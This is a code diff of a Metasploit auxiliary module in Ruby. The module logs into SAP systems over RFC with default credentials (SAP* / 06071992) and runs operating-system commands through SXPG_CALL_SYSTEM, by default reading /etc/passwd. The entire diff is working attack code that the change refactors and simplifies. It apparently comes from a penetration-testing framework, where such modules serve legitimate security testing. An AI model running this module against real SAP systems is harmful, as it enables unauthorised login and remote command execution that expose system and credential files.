@@ -13,6 +13,7 @@ require 'msf/core'
 require 'msf/core/exploit/sap'
 
 class Metasploit4 < Msf::Auxiliary
+
   include Msf::Exploit::SAP
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -26,67 +27,44 @@ class Metasploit4 < Msf::Auxiliary
       },
       'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
       'Author'         => [ 'nmonkee' ],
-      'License'        => BSD_LICENSE
-       )
+      'License'        => BSD_LICENSE,
+      'DefaultOptions' => {
+        'CLIENT' => "000"
+      }
+    )
 
     register_options(
-                     [
-                       Opt::RPORT(3342),
-                       OptString.new('USER', [true, 'Username', 'SAP*']),
-                       OptString.new('PASS', [true, 'Password', '06071992']),
-                       OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
-                       OptString.new('PARAM', [true, 'Command Parameters', '/etc/passwd']),
-                       OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
-                     ], self.class)
+    [
+      Opt::RPORT(3342),
+      OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+      OptString.new('PASSWORD', [true, 'Password', '06071992']),
+      OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
+      OptString.new('PARAM', [true, 'Command Parameters', '/etc/passwd']),
+    ], self.class)
   end
 
   def run_host(rhost)
-    user = datastore['USER']
-    pass = datastore['PASS']
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    os = datastore['OS']
-
-    exec_CMD(user,client,pass,rhost,datastore['RPORT'], datastore['CMD'], datastore['PARAM'], os)
+    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['RPORT'], datastore['CMD'], datastore['PARAM'])
+    print res if res
   end
 
-  def exec_CMD(user, client, pass, rhost, rport, cmd, param, os)
+  def exec_CMD(user, client, password, rhost, rport, cmd, param)
     begin
       conn = login(rhost, rport, client, user, password)
       conn.connection_info
-      function = conn.get_function("SXPG_CALL_SYSTEM")
-      fc = function.get_function_call
-
-      fc[:COMMANDNAME] = cmd
-      fc[:ADDITIONAL_PARAMETERS] = param
-
       begin
-        fc.invoke
-        saptbl = Msf::Ui::Console::Table.new(
-                  Msf::Ui::Console::Table::Style::Default,
-                    'Header'  => "[SAP] Command Exec #{rhost}:#{rport}:#{client}",
-                    'Columns' =>
-                              [
-                                "Output"
-                              ])
-
-        data_length = fc[:EXEC_PROTOCOL].size
-
-        for i in 0...data_length
-          data = fc[:EXEC_PROTOCOL][i][:MESSAGE]
-          saptbl << [data]
-        end
-
-
-        print_good("Command Executed: #{cmd} #{param}")
-        print(saptbl.to_s)
+        data = sxpg_call_system(conn, {:COMMANDNAME => cmd, :ADDITIONAL_PARAMETERS => param})
+        return data
       rescue NWError => e
-        print_error("#{rhost}:#{rport} [SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
+        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
       end
     rescue NWError => e
-      print_error("#{rhost}:#{rport} [SAP] exec_CMD - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
     ensure
       if conn
         conn.disconnect
